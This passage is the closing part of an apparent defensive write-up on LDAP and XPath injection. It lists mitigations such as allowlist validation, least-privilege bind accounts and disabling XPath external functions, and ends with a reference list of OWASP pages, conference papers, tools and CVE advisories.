2. **Strict allowlist validation** — not blocklist escaping — at the input boundary, permitting only short alphanumeric strings in LDAP/XPath parameters.
3. **Principle of least privilege** on LDAP binding accounts, ensuring that even successful injection cannot access sensitive attributes (`userPassword`, `unicodePwd`) or privileged OUs.
4. **XPath version restriction** — disabling `doc()`, extension functions, and external document access at the library configuration level when they are not needed.
5. **WAF rules** as defense-in-depth (not primary defense), aware of both LDAP and XPath metacharacter encoding variants.

---

*This document was created for defensive security research and vulnerability understanding purposes.*

## References

- OWASP — LDAP Injection: https://owasp.org/www-community/attacks/LDAP_Injection
- OWASP — XPath Injection: https://owasp.org/www-community/attacks/XPATH_Injection
- OWASP — Blind XPath Injection: https://owasp.org/www-community/attacks/Blind_XPath_Injection
- OWASP — LDAP Injection Prevention Cheat Sheet: https://cheatsheetseries.owasp.org/cheatsheets/LDAP_Injection_Prevention_Cheat_Sheet.html
- BlackHat Europe 2008 — LDAP Injection & Blind LDAP Injection in Web Applications (Alonso, Parada): https://blackhat.com/presentations/bh-europe-08/Alonso-Parada/Whitepaper/bh-eu-08-alonso-parada-WP.pdf
- BlackHat USA 2016 — A Journey From JNDI/LDAP Manipulation to RCE Dream Land (Munoz): https://blackhat.com/docs/us-16/materials/us-16-Munoz-A-Journey-From-JNDI-LDAP-Manipulation-To-RCE-wp.pdf
- BlackHat Europe 2012 — Hacking XPath 2.0 (Siddharth): https://media.blackhat.com/bh-eu-12/Siddharth/bh-eu-12-Siddharth-Xpath-WP.pdf
- Watchfire — Blind XPath Injection Whitepaper: https://repository.root-me.org/Exploitation%20-%20Web/EN%20-%20Blind%20Xpath%20injection.pdf
- PayloadsAllTheThings — LDAP Injection: https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/LDAP%20Injection
- PayloadsAllTheThings — XPath Injection: https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XPATH%20Injection
- HackTricks — LDAP Injection: https://book.hacktricks.wiki/pentesting-web/ldap-injection.html
- HackTricks — XPath Injection: https://book.hacktricks.wiki/pentesting-web/xpath-injection.html
- XCat — XPath Injection Tool: https://github.com/orf/xcat
- CVE-2024-36401 — GeoServer RCE: https://github.com/geoserver/geoserver/security/advisories/GHSA-6jj6-gm7p-fcvv
- CVE-2024-39565 — Juniper J-Web XPath Injection: https://nvd.nist.gov/vuln/detail/CVE-2024-39565
- CVE-2024-49112/49113 — Windows LDAP RCE/DoS: https://www.trendmicro.com/en_us/research/25/a/what-we-know-about-cve-2024-49112-and-cve-2024-49113.html
- CVE-2025-29810 — Active Directory LDAP Injection: https://nvd.nist.gov/vuln/detail/CVE-2025-29810
- Rhino Security Labs — XPath Injection Attack and Defense: https://rhinosecuritylabs.com/penetration-testing/xpath-injection-attack-defense-techniques/
- SANS — Understanding and Exploiting Web-based LDAP: https://www.sans.org/blog/understanding-and-exploiting-web-based-ldap
